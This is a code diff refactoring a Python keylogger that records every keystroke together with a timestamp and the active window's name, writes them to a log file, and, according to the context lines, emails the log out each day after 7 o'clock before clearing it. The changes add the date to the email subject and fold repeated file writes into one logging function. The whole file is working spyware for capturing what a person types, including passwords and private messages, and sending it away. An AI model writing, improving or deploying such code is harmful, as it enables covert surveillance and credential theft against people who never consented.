@@ -25,9 +25,10 @@ if check_time != 0:
     time = int(time[0:2])
     # If it's time then the log will be emailed, deleted and the last check day will be updated
     if time >= 7:
+        today = str(date.today())
         file = open("log_file", "r")
         file_text = file.read()
-        email_text = 'Subject: Your e-mail subject\n\n'
+        email_text = 'Subject: Your e-mail subject ' + today + '\n\n'
         email_text += file_text
         email_text = email_text.encode('utf-8')
 
@@ -45,8 +46,8 @@ if check_time != 0:
         file.truncate(0)
         file.close()
 
-# Function to put the date and name of the active window in the log file
-def info():
+# Function to put the date, the name of the active window and the key in the log file
+def add_log(skey):
     current_time = datetime.now()
     current_time_hour = str(current_time.hour)
     current_time_minute = str(current_time.minute)
@@ -57,89 +58,45 @@ def info():
         return False
 
     file = open('log_file', 'a')
-    file.writelines("\n" +  current_time_hour + ":" + current_time_minute + ":" + current_time_second + " | " + window_name + ": ")
+    file.writelines("\n" +  current_time_hour + ":" + current_time_minute + ":" + current_time_second + " | " + window_name + ": " + skey)
     file.close()
     
-# Function that listens to what the user types and adds to the log file
+# Function that transform what the user types and send it to add_log function
 def press(key):
     try:
         if key == keyboard.Key.esc:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<esc>")
-            file.close()
+            add_log("<esc>")
         elif key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<win>")
-            file.close()
+            add_log("<win>")
         elif key == keyboard.Key.delete:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<delete>")
-            file.close()
+            add_log("<delete>")
         elif key == keyboard.Key.space:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<space>")
-            file.close()
+            add_log("<space>")
         elif key == keyboard.Key.backspace:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<backspace>")
-            file.close()
+            add_log("<backspace>")
         elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<shift>")
-            file.close()
+            add_log("<shift>")
         elif key == keyboard.Key.enter:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<enter>")
-            file.close()
+            add_log("<enter>")
         elif key == keyboard.Key.tab:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<tab>")
-            file.close()
+            add_log("<tab>")
         elif key == keyboard.Key.alt_gr or key == keyboard.Key.alt_l or key == keyboard.Key.alt_r or key == keyboard.Key:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<alt>")
-            file.close()
+            add_log("<alt>")
         elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or key == keyboard.Key.ctrl:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<ctrl>")
-            file.close()
+            add_log("<ctrl>")
         elif key == keyboard.Key.caps_lock:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<caps_lock>")
-            file.close()
+            add_log("<caps_lock>")
         elif key == keyboard.Key.left:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<left_arrow>")
-            file.close()
+            add_log("<left_arrow>")
         elif key == keyboard.Key.right:
-            file = open('log_file', 'a')
-            info()
-            file.writelines("<right_arrow>")
-            file.close()
+            add_log("<right_arrow>")
         else:
-            file = open('log_file', 'a')
-            info()
-            file.writelines(f"" + "<{0}>".format(
-                    key.char))
-            file.close()
+            ekey = (f"" + "<{0}>".format(key.char))
+            add_log(ekey)
     except AttributeError:
-        file = open('log_file', 'a')
-        file.writelines('')
-        file.close()
+        add_log("Key not Found")
 
-# Start the listener, if it stops working while listening, will be restarted
+# Start the listener. If it stops working while listening, will be restarted
 setrecursionlimit(10000)
 
 def start():
